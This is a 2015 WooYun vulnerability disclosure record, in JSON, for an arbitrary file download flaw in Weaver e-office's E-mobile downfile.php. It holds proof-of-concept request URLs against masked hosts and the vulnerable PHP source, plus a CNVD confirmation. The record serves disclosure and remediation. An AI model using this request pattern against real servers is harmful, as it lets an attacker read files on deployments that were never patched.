{"id": 70261, "wybug_id": "wooyun-2015-0125286", "wybug_title": "泛微e-office 任意文件下载", "wybug_corp": "泛微e-office", "wybug_author": "menmen519", "wybug_date": "2015-07-10 11:01", "wybug_open_date": "2015-10-08 11:52", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-10：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向公众公开  简要描述： 泛微e-office 任意文件下载 详细说明：  http://**.**.**.**/E-mobile/Data/downfile.php?url=/E-mobile/Data/downfile.phphttp://**.**.**.**/E-mobile/Data/downfile.php?url=/E-mobile/Data/downfile.phphttp://**.**.**.**/E-mobile/Data/downfile.php?url=/E-mobile/Data/downfile.phphttp://**.**.**.**:8028/E-mobile/Data/downfile.php?url=/E-mobile/Data/downfile.php阅读源码：Data/downfile.php\n$fileurl = $_REQUEST['url'];$sessionstr = $_REQUEST['sessionkey'];$strexplode = explode( \",\", $sessionstr );$sessionkey = $strexplode[0];$curr_user_id = $strexplode[1];$rooturl = \"http://\".$_SERVER['HTTP_HOST'];$checkurl = explode( \"/\", $fileurl );if ( $checkurl[1] == \"flowimg\" ){\t\t\t\t$url = $rooturl.\"/E-mobile/flowimg.php?RUN_ID=\".$checkurl[2].\"&FLOW_ID=\".$checkurl[3];\t\t\t\t$type = \"png\";}else if ( $checkurl[1] == \"freeflowimg\" ){\t\t\t\t$url = $rooturl.\"/E-mobile/flow/freeflowimg.php?RUN_ID=\".$checkurl[2].\"&FLOW_ID=\".$checkurl[3];\t\t\t\t$type = \"png\";}else{\t\t\t\t$url = $rooturl.$fileurl;\t\t\t\t$filetype = pathinfo( $fileurl );\t\t\t\t$type = $filetype['extension'];}if ( $type == \"css\" ){\t\t\t\theader( \"Content-Type: text/css\" );}else if ( $type == \"js\" ){\t\t\t\theader( \"Content-Type: application/javascript\" );}else if ( $type == \"jpg\" || $type == \"jpeg\" || $type == \"JPG\" || $type == \"JPEG\" ){\t\t\t\theader( \"Content-Type: image/jpeg\" );}else if ( $type == \"png\" || $type == \"PNG\" ){\t\t\t\theader( \"Content-Type: image/png\" );}else if ( $type == \"bmp\" || $type == \"BMP\" ){\t\t\t\theader( \"Content-Type: image/bmp\" );}else if ( $type == \"gif\" || $type == \"GIF\" ){\t\t\t\theader( \"Content-Type: image/gif\" );}else if ( $type == \"pdf\" || $type == \"PDF\" ){\t\t\t\theader( \"Content-Type: application/pdf\" );}else if ( $type == \"rar\" || $type == \"RAR\" ){\t\t\t\theader( \"Content-Type: application/x-rar-compressed\" );}else if ( $type == \"exe\" || $type == \"EXE\" ){\t\t\t\theader( \"Content-Type: application/octet-stream\" );}else if ( $type == \"zip\" || $type == \"ZIP\" ){\t\t\t\theader( \"Content-Type: application/zip\" );}else if ( $type == \"doc\" || $type == \"DOC\" ){\t\t\t\theader( \"Content-Type: application/msword\" );}else if ( $type == \"docx\" || $type == \"DOCX\" ){\t\t\t\theader( \"Content-Type: application/msword\" );}else if ( $type == \"xls\" || $type == \"XLS\" || $type == \"csv\" || $type == \"CSV\" ){\t\t\t\theader( \"Content-Type: application/vnd.ms-excel\" );}else if ( $type == \"ppt\" || $type == \"PPT\" ){\t\t\t\theader( \"Content-Type: application/vnd.ms-powerpoint\" );}else if ( $type == \"txt\" || $type == \"TXT\" ){\t\t\t\theader( \"Content-Type: text/plain\" );}else{\t\t\t\theader( \"Content-Type: application/force-download\" );}$content = file_get_contents( $url );echo $content;?>\n主要代码$url = $rooturl.$fileurl;\t\t\t\t$filetype = pathinfo( $fileurl );\t\t\t\t$type = $filetype['extension'];然后$content = file_get_contents( $url );echo $content;   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-07-10 11:52 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商（或网站管理方）公开联系渠道向其邮件（和电话）通报，由其后续提供解决方案并协调相关用户单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-09 15:43 |    \t\t君宝 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 不要跟我比浪。。你浪不过我。。)\t\t \n  任意文件遍历/下载    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}